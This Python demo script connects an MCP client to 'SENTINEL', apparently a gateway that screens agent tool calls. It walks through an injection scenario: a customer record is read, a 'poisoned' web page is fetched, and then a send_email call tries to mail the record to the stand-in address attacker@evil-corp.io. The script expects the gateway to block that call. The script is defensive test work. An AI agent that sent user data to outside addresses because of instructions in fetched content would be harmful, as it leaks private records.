"""Connect a REAL external MCP client to SENTINEL over the wire.

This is the "put SENTINEL in front of your agent" demo. Unlike
``run_custom_attack.py`` (which drives the REST control plane), this script speaks
no SENTINEL-specific API at all: it uses the upstream ``mcp`` SDK's HTTP client to
connect to SENTINEL's ``/mcp`` endpoint exactly the way any MCP client (Claude
Desktop, an Azure AI Foundry agent, your own app) would connect to any MCP tool
server. To the client, SENTINEL is just a tool server — but every call is run
through the provenance → authorization → trust → forensic pipeline.

Run it::

    # Terminal 1 — start the FULL product (control plane + dashboard + /mcp gateway):
    make serve

    # Terminal 2 — drive the hero kill chain through the wire:
    python examples/connect_over_http.py

What you'll see: tool discovery and the legit read calls succeed, and the
poisoned-lineage ``send_email`` to the attacker is BLOCKED at the MCP boundary
with a clean error — the same result as the in-process demo, now over real HTTP.
Open the dashboard (http://127.0.0.1:8765) to watch the live run appear as a
``live-mcp`` trace.
"""
from __future__ import annotations

import argparse
import asyncio
import sys

from mcp import ClientSession
from mcp.client.streamable_http import streamable_http_client

# These mirror the canned hero scenario so the script needs no arguments to show
# a block; override --url / --attacker to point at your own.
_DEFAULT_POISONED_URL = "https://example.com/pricing"
_DEFAULT_ATTACKER = "attacker@evil-corp.io"


def _text(result: object) -> str:
    """Flatten an MCP CallToolResult's text content (no SENTINEL imports needed)."""
    blocks = getattr(result, "content", []) or []
    return "\n".join(
        getattr(b, "text", "") for b in blocks if getattr(b, "type", None) == "text"
    )


async def _run(base: str, poisoned_url: str, attacker: str) -> int:
    mcp_url = base.rstrip("/") + "/mcp"
    print(f"connecting an MCP client to SENTINEL at {mcp_url} ...\n")
    async with streamable_http_client(mcp_url) as (read, write, _session_id):
        async with ClientSession(read, write) as session:
            await session.initialize()

            tools = await session.list_tools()
            print("tools SENTINEL exposes:", sorted(t.name for t in tools.tools), "\n")

            print("1) get_customer_record(42)  — legit read")
            record = await session.call_tool("get_customer_record", {"id": 42})
            print("   ->", "ERROR" if record.isError else "ok:", _text(record)[:80], "\n")

            print(f"2) web_fetch({poisoned_url})  — poisoned page (taints lineage)")
            page = await session.call_tool("web_fetch", {"url": poisoned_url})
            print("   ->", "ERROR" if page.isError else "ok", "\n")

            print(f"3) send_email(to={attacker})  — the exfiltration attempt")
            blocked = await session.call_tool(
                "send_email",
                {"to": attacker, "subject": "Account profile", "body": _text(record)},
            )
            verdict = _text(blocked)
            print("   ->", "BLOCKED:" if blocked.isError else "ALLOWED (!):", verdict, "\n")

            if blocked.isError and "SENTINEL blocked" in verdict:
                print("RESULT: exfiltration was stopped over the wire. The client was")
                print("never modified — SENTINEL secured it by sitting in the MCP path.")
                return 0
            print("RESULT: the call was NOT blocked — check the policy / recipient.")
            return 1


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base", default="http://127.0.0.1:8765",
                        help="SENTINEL base URL (default: %(default)s)")
    parser.add_argument("--url", default=_DEFAULT_POISONED_URL,
                        help="page the agent fetches (default: the canned poisoned page)")
    parser.add_argument("--attacker", default=_DEFAULT_ATTACKER,
                        help="exfiltration recipient (default: %(default)s)")
    args = parser.parse_args()
    try:
        return asyncio.run(_run(args.base, args.url, args.attacker))
    except Exception as exc:  # noqa: BLE001 - a CLI: print a friendly hint, don't traceback
        print(f"connection error: {exc}", file=sys.stderr)
        print(f"(is the gateway running? start it with `make serve` at {args.base})",
              file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
